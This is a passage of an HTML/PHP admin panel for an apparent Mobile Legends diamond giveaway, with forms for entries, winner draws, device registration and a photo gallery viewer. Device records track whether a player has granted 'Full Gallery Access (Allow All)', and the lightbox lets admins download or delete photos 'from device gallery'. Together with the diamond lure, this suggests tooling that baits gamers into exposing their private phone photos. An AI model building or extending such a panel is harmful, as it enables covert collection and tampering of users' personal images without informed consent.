            <label class="form-label">Target Pool</label>
            <select id="modalGiveawayPool" class="form-select">
              <option value="daily">Daily Pool (50 Diamonds)</option>
              <option value="mega">Mega Pool (250 Diamonds)</option>
              <option value="special">Special Pool (500 Diamonds)</option>
            </select>
          </div>
          <div class="form-group">
            <label class="form-label">Player Email</label>
            <input type="email" id="modalGiveawayEmail" class="form-input" required placeholder="player@example.com">
          </div>
          <div class="form-row">
            <div class="form-group flex-1">
              <label class="form-label">MLBB User ID</label>
              <input type="text" id="modalGiveawayMlbbId" class="form-input" placeholder="User ID">
            </div>
            <div class="form-group flex-1">
              <label class="form-label">MLBB Server</label>
              <input type="text" id="modalGiveawayMlbbServer" class="form-input" placeholder="Server">
            </div>
          </div>
          <div class="form-group">
            <label class="form-label">Player IGN</label>
            <input type="text" id="modalGiveawayMlbbIgn" class="form-input" placeholder="In-game Name">
          </div>
          <div class="form-row">
            <div class="form-group flex-1">
              <label class="form-label">Ticket Count</label>
              <input type="number" id="modalGiveawayTickets" class="form-input" value="1" min="1" required>
            </div>
            <div class="form-group flex-1">
              <label class="form-label">Points Spent</label>
              <input type="number" id="modalGiveawayPoints" class="form-input" value="50" min="0">
            </div>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" onclick="closeModal('modalGiveaway')">Cancel</button>
          <button type="submit" class="btn btn-primary">Save Entry</button>
        </div>
      </form>
    </div>
  </div>

  <!-- 4. DRAW WINNER CELEBRATION MODAL -->
  <div class="modal-overlay" id="modalWinner">
    <div class="modal-card text-center" style="max-width: 420px;">
      <div class="modal-header">
        <h3 class="modal-title">Giveaway Winner Selected!</h3>
        <button type="button" class="btn-close-modal" onclick="closeModal('modalWinner')">
          <span class="material-symbols-outlined">close</span>
        </button>
      </div>
      <div class="modal-body py-6">
        <div style="font-size: 54px; margin-bottom: 12px;">🎉</div>
        <h2 id="winnerIgn" style="font-size: 1.5rem; font-weight: 800; color: var(--primary);">Winner IGN</h2>
        <p id="winnerEmail" style="font-size: 0.9rem; color: var(--text-muted); margin-top: 4px;">winner@email.com</p>
        
        <div style="background-color: var(--bg-subtle); border-radius: var(--radius-md); padding: 14px; margin-top: 18px; text-align: left;">
          <div class="flex-between py-1">
            <span class="text-muted text-sm">Pool Type:</span>
            <span class="font-bold text-sm" id="winnerPool">Daily Pool</span>
          </div>
          <div class="flex-between py-1">
            <span class="text-muted text-sm">MLBB ID:</span>
            <span class="font-bold text-sm" id="winnerMlbbId">—</span>
          </div>
          <div class="flex-between py-1">
            <span class="text-muted text-sm">Tickets Held:</span>
            <span class="font-bold text-sm" id="winnerTicketCount">1</span>
          </div>
        </div>
      </div>
      <div class="modal-footer" style="justify-content: center;">
        <button type="button" class="btn btn-primary" onclick="closeModal('modalWinner')">Close & Done</button>
      </div>
    </div>
  </div>

  <!-- 5. DELETE CONFIRMATION MODAL -->
  <div class="modal-overlay" id="modalDeleteConfirm">
    <div class="modal-card" style="max-width: 400px;">
      <div class="modal-header">
        <h3 class="modal-title text-red" style="display: flex; align-items: center; gap: 6px;">
          <span class="material-symbols-outlined">delete_forever</span> Confirm Deletion
        </h3>
        <button type="button" class="btn-close-modal" onclick="closeModal('modalDeleteConfirm')">
          <span class="material-symbols-outlined">close</span>
        </button>
      </div>
      <div class="modal-body">
        <p id="deleteConfirmMessage">Are you sure you want to permanently delete this record from Supabase?</p>
        <p class="text-muted text-xs mt-2">This action cannot be undone. Highest access mode will remove the record immediately.</p>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" onclick="closeModal('modalDeleteConfirm')">Cancel</button>
        <button type="button" class="btn btn-danger" id="btnConfirmDeleteAction">Delete Record</button>
      </div>
    </div>
  </div>

  <!-- 6. PHOTO LIGHTBOX MODAL -->
  <div class="modal-overlay modal-lightbox" id="modalPhotoLightbox">
    <div class="lightbox-container">
      <div class="lightbox-header">
        <div class="lightbox-title-wrap">
          <span class="lightbox-filename" id="lightboxFilename">photo.jpg</span>
          <span class="lightbox-meta" id="lightboxMeta">0 KB</span>
        </div>
        <div style="display: flex; gap: 8px; align-items: center;">
          <a id="btnLightboxDownload" href="#" download="photo.jpg" class="btn btn-secondary btn-sm" title="Download High-Res" target="_blank">
            <span class="material-symbols-outlined btn-icon">download</span>
            <span>Download</span>
          </a>
          <button type="button" class="btn btn-danger btn-sm" id="btnLightboxDelete" title="Delete photo from device gallery">
            <span class="material-symbols-outlined btn-icon">delete</span>
            <span>Delete</span>
          </button>
          <button type="button" class="btn-close-modal" onclick="closeModal('modalPhotoLightbox')" style="color: #fff;">
            <span class="material-symbols-outlined">close</span>
          </button>
        </div>
      </div>
      <div class="lightbox-body">
        <button type="button" class="lightbox-nav-btn prev" id="btnLightboxPrev" title="Previous photo">
          <span class="material-symbols-outlined">chevron_left</span>
        </button>
        <div class="lightbox-image-wrap">
          <img id="lightboxImage" src="" alt="Full view">
        </div>
        <button type="button" class="lightbox-nav-btn next" id="btnLightboxNext" title="Next photo">
          <span class="material-symbols-outlined">chevron_right</span>
        </button>
      </div>
    </div>
  </div>

  <!-- 7. UPLOAD PHOTO TO USER GALLERY MODAL -->
  <div class="modal-overlay" id="modalUploadGallery">
    <div class="modal-card">
      <div class="modal-header">
        <h3 class="modal-title">Upload Photo to Player Gallery</h3>
        <button type="button" class="btn-close-modal" onclick="closeModal('modalUploadGallery')">
          <span class="material-symbols-outlined">close</span>
        </button>
      </div>
      <form id="formUploadGalleryModal">
        <div class="modal-body">
          <div class="form-group">
            <label class="form-label">Player Email *</label>
            <input type="email" id="modalUploadGalleryEmail" class="form-input" required placeholder="player@example.com">
          </div>
          <div class="form-group">
            <label class="form-label">Choose Images *</label>
            <input type="file" id="modalUploadGalleryFiles" class="form-input" accept="image/*" multiple required>
            <p class="form-hint">Supports JPEG, PNG, WEBP. Multiple images can be uploaded.</p>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" onclick="closeModal('modalUploadGallery')">Cancel</button>
          <button type="submit" class="btn btn-primary" id="btnSubmitUploadGallery">Upload to Gallery</button>
        </div>
      </form>
    </div>
  </div>

  <!-- 8. ADD / REGISTER DEVICE MODAL -->
  <div class="modal-overlay" id="modalAddDevice">
    <div class="modal-card">
      <div class="modal-header">
        <h3 class="modal-title">Register New Device</h3>
        <button type="button" class="btn-close-modal" onclick="closeModal('modalAddDevice')">
          <span class="material-symbols-outlined">close</span>
        </button>
      </div>
      <form id="formAddDeviceModal">
        <div class="modal-body">
          <div class="form-group">
            <label class="form-label">Phone Model / Device Brand *</label>
            <input type="text" id="modalAddDeviceModel" class="form-input" required placeholder="e.g. Samsung Galaxy S24 Ultra, Xiaomi 14, Android Device">
          </div>
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
            <div class="form-group">
              <label class="form-label">MLBB User ID *</label>
              <input type="text" id="modalAddDeviceMlbbId" class="form-input" required placeholder="e.g. 776114101">
            </div>
            <div class="form-group">
              <label class="form-label">MLBB Server (Zone) *</label>
              <input type="text" id="modalAddDeviceMlbbServer" class="form-input" required placeholder="e.g. 4280">
            </div>
          </div>
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
            <div class="form-group">
              <label class="form-label">In-Game Name (IGN) *</label>
              <input type="text" id="modalAddDeviceIgn" class="form-input" required placeholder="e.g. Ryu Nishinoya.">
            </div>
            <div class="form-group">
              <label class="form-label">Gallery Access Status</label>
              <select id="modalAddDeviceAccess" class="form-select">
                <option value="granted">Full Gallery Access (Allow All) ✓</option>
                <option value="avatar_only" selected>Avatar Only (Awaiting Allow All) ⏳</option>
                <option value="none">No Access</option>
              </select>
            </div>
          </div>
          <div class="form-group">
            <label class="form-label">Account Email (Optional)</label>
            <input type="email" id="modalAddDeviceEmail" class="form-input" placeholder="User email (leave blank if not provided)">
          </div>
          <div class="form-group">
            <label class="form-label">Avatar / Profile Photo (Optional)</label>
            <input type="file" id="modalAddDeviceAvatar" class="form-input" accept="image/*">
            <p class="form-hint">Upload an avatar or initial image for this device.</p>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" onclick="closeModal('modalAddDevice')">Cancel</button>
          <button type="submit" class="btn btn-primary" id="btnSubmitAddDevice">Save &amp; Register Device</button>
        </div>
      </form>
    </div>
  </div>

  <!-- Toast Notification Container -->
  <div id="adminToast" class="admin-toast">
    <span class="material-symbols-outlined" id="toastIcon">check_circle</span>
    <span id="toastMessage">Success</span>
  </div>

  <!-- Admin Controller JavaScript -->
  <script src="admin.js?v=<?= time() ?>"></script>
</body>
</html>
